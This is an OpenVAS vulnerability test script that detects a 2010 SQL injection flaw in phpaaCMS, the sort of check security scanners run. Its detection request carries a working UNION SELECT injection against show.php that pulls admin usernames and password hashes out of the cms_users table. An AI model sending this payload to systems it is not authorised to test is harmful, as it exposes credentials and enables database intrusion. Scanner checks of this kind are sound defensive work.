##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpaa_cms_sql_inj_vuln.nasl 14233 2019-03-16 13:32:43Z mmartin $
#
# phpaaCMS 'id' Parameter SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801408");
  script_version("$Revision: 14233 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-16 14:32:43 +0100 (Sat, 16 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-07-19 10:09:06 +0200 (Mon, 19 Jul 2010)");
  script_cve_id("CVE-2010-2719", "CVE-2010-2720");
  script_bugtraq_id(41341);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("phpaaCMS 'id' Parameter SQL Injection Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/40450");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/14201/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/14199/");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/1690");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"The flaws are due to input validation errors in the 'show.php'
  and 'list.php' scripts when processing the 'id' parameter, which could be
  exploited by malicious people to conduct SQL injection attacks.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running phpaaCMS and is prone SQL injection
  vulnerabilities.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to view, add, modify
  or delete information in the back-end database.");
  script_tag(name:"affected", value:"phpaaCMS 0.3.1 UTF-8");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

phpPort = get_http_port(default:80);

if (!can_host_php(port:phpPort)) exit(0);

foreach dir (make_list_unique("/phpaaCMS", "/" , cgi_dirs(port:phpPort)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"), port:phpPort);

  if(">phpAA" >< rcvRes)
  {
    sndReq = http_get(item:string(dir, "/show.php?id=-194%20union%20all%20" +
               "select%201,2,3,4,5,6,7,8,9,10,concat(username,0x3a,password)" +
               ",12,13,14,15%20from%20cms_users--"), port:phpPort);
    rcvRes = http_keepalive_send_recv(port:phpPort, data:sndReq);

    if(">admin:" >< rcvRes)
    {
      security_message(port:phpPort);
      exit(0);
    }
  }
}

exit(99);